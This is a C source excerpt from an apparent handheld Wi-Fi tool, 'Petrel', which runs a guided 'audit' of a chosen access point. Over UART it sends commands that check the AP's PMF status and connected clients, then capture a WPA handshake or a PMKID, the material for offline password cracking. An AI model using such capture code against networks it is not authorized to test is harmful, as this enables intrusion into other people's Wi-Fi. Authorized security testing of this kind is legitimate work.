// E: guided audit for the selected AP — grab + write /ext/petrel/audit.json.
static void petrel_start_audit(Petrel* app) {
    int ch;
    char hex[13];
    petrel_sel_ap(app, &ch, hex);
    audit_mode = true;
    audit_ch = ch;
    audit_sec = 0;
    audit_ssid[0] = '\0';
    audit_bssid[0] = '\0';
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        strncpy(audit_ssid, app->wifiList[app->selectedWifi].APssid, sizeof(audit_ssid) - 1);
        audit_ssid[sizeof(audit_ssid) - 1] = '\0';
        strncpy(audit_bssid, app->wifiList[app->selectedWifi].APbssid, sizeof(audit_bssid) - 1);
        audit_bssid[sizeof(audit_bssid) - 1] = '\0';
        audit_sec = app->wifiList[app->selectedWifi].security;
    }
    // Target BSSID as bytes for capture binding. A wildcard (no AP / all-F) does not bind.
    audit_bssid_valid = false;
    if(hex[0] && strcmp(hex, "FFFFFFFFFFFF") != 0 && strlen(hex) == 12) {
        bool okb = true;
        for(int i = 0; i < 12 && okb; i++) okb = is_hex(hex[i]);
        if(okb) {
            for(int i = 0; i < 6; i++)
                audit_bssid_bytes[i] = (uint8_t)((hexnib(hex[i * 2]) << 4) | hexnib(hex[i * 2 + 1]));
            audit_bssid_valid = true;
        }
    }
    strncpy(audit_hex, hex, sizeof(audit_hex) - 1);   // kept for the STASCAN/grab the chain sends
    audit_hex[sizeof(audit_hex) - 1] = '\0';
    // Unsupported target: an open / WEP AP has no WPA 4-way handshake or RSN PMKID to capture, so
    // there is nothing to audit. WPA1/WPA2/WPA3 all have a 4-way handshake (or PMKID), so they are
    // auditable. Record a structured unsupported result (not just a popup) so a refused audit still
    // leaves evidence in the session dir, then explain on screen.
    if(!(audit_sec & (WPA_SECURITY | WPA2_SECURITY | WPA3_SECURITY))) {
        audit_write_json("unsupported", 0, false, false, "open/WEP: no WPA to audit", "");
        audit_mode = false;
        snprintf(popupHeader, sizeof(popupHeader), "Audit");
        snprintf(message, sizeof(message), "Open/WEP AP: no WPA\nhandshake or PMKID to audit");
        post_event(app, PETREL_EVT_POPUP);
        return;
    }
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "Audit");
    wpa_lines[0] = '\0';
    // Guided method selection is PMF- and station-aware (vs. the old coarse security-bit guess). We
    // first learn the AP's PMF posture with a PMFSCAN; if it is deauthable we then check whether it
    // has associated clients with a BSSID-filtered STASCAN. PMFDONE/STADONE run audit_pick_method()
    // and launch the grab (see audit_send_grab). That attribution needs a concrete BSSID, so the
    // scan chain only runs for a specific target; a wildcard keeps the old bit heuristic.
    audit_phase = AUDIT_PHASE_NONE;
    audit_pmf_seen = false;
    audit_pmf_req = false;
    audit_stas = 0;
    if(audit_bssid_valid) {
        char cmd[32];
        snprintf(cmd, sizeof(cmd), "PMFSCAN %d 5\n", ch);
        uart_helper_send(app->uart_helper, cmd, strlen(cmd));
        audit_phase = AUDIT_PHASE_PMF;
        { char b[48]; snprintf(b, sizeof(b), "PMF scan ch %d...", ch);
          petrel_busy_ex(app, "Audit: PMF", b, 5); }
        return;
    }
    // Wildcard target (no specific AP): scans can't be attributed to one BSSID, so fall back to the
    // coarse heuristic - PMF/WPA3 bits -> clientless PMKID, else handshake (unchanged behavior).
    bool pmf = (audit_sec & WPA3_SECURITY) || (audit_sec & AES_CMAC_ENABLED);
    char cmd[72];
    const char* label;
    if(pmf) {
        snprintf(cmd, sizeof(cmd), "PMKIDCLIENT %d %s %s\n", ch, "FFFFFFFFFFFF", audit_ssid);
        label = "Audit (PMKID, PMF)";
    } else {
        snprintf(cmd, sizeof(cmd), "HSGRAB %d %s 20\n", ch, "FFFFFFFFFFFF");
        label = "Audit (handshake)";
    }
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    { char b[48]; snprintf(b, sizeof(b), "%s ch %d...", pmf ? "PMKID" : "HS", ch);
      petrel_busy_ex(app, label, b, 20); }
}

// A: capability check from the board's IDENT. Unknown/old fw -> permissive.
static bool petrel_has_cap(Petrel* app, char cap) {
    // An UNKNOWN board must not be treated as capable. This used to return true when the caps
    // string was empty, so a board that had not even answered HELLO presented every
    // capability-gated tool - and pressing one of those rows did nothing or failed confusingly.
    // Deny instead; the hub and the Tools header say "no board" so the user knows why the rows
    // are missing.
    if(app->fw_caps[0] == '\0') return false;
    return strchr(app->fw_caps, cap) != NULL;
}

